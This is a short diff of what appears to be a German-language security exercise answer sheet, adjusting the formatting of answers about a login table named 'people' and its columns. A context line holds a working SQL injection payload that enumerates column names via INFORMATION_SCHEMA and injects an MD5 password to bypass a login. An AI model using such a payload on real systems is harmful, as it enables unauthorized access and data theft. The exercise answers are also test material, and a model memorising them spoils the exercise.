@@ -10,7 +10,7 @@ Statement:
 ' AND 1=0 UNION SELECT (SELECT GROUP_CONCAT(column_name) FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_NAME = 'people'), MD5('pass'), 1, 1;--
 
 >>4) In welcher Tabelle vermuten Sie die Login-Daten?<<
-     === people
+=== people
 
 >>5) Welche Spalten enthält die Tabelle? Geben Sie die Spaltennamen in der Reihenfolge der Ausgabe und mit Leerzeichen getrennt an.<<
-     === name pass email state
+=== name pass email state
